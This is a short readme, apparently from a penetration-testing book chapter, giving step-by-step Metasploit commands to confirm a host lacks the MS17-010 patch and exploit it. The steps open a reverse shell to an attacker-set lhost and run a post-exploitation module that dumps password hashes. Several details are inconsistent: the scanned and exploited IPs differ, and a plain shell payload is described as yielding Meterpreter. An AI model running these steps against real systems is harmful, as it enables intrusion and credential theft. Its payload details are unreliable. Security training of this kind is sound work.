# Chapter 7 Readme

## Introduction
This readme provides a step-by-step guide on verifying the absence of the MS17-010 patch and exploiting the vulnerability to gain shell access on a target system. This process involves the use of Metasploit and its auxiliary and exploit modules.

## Prerequisites
- Metasploit installed and configured.
- Knowledge of the target system's IP address.

## Verifying the Patch
1. Open a terminal and launch the Metasploit console: `msfconsole`
2. Navigate to the auxiliary scanner module: `use auxiliary/scanner/smb/smb_ms17_010`
3. Set the target IP address: `set rhosts 10.0.10.227`
4. Run the module: `run`
5. The output will indicate if the host is likely vulnerable to MS17-010.

## Exploiting the Vulnerability
1. Identify your IP address within Metasploit: `ifconfig`
2. Load the MS17-010 exploit module: `use exploit/windows/smb/ms17_010_psexec`
3. Set the target host: `set rhost 10.0.10.208`
4. Specify the payload: `set payload windows/x64/shell/reverse_tcp`
5. Set the localhost IP address for the reverse shell: `set lhost 10.0.10.160`
6. Launch the exploit: `exploit`
7. The Meterpreter shell will be opened, providing a reverse shell and control over the target system.

## Meterpreter Shell
- To enter an OS command prompt: `shell`
- To return to the Meterpreter shell: `exit`

## Useful Commands
- Check running processes: `ps`
- Run post-exploitation modules: `run post/windows/gather/smart_hashdump`

**Note:** Exercise caution when exploiting vulnerabilities on production systems. Inform the client before performing exploits during a penetration test.

For more details on Metasploit and Meterpreter, refer to the Metasploit Unleashed documentation and the book "Metasploit: The Penetration Tester’s Guide" (Chapter 6).
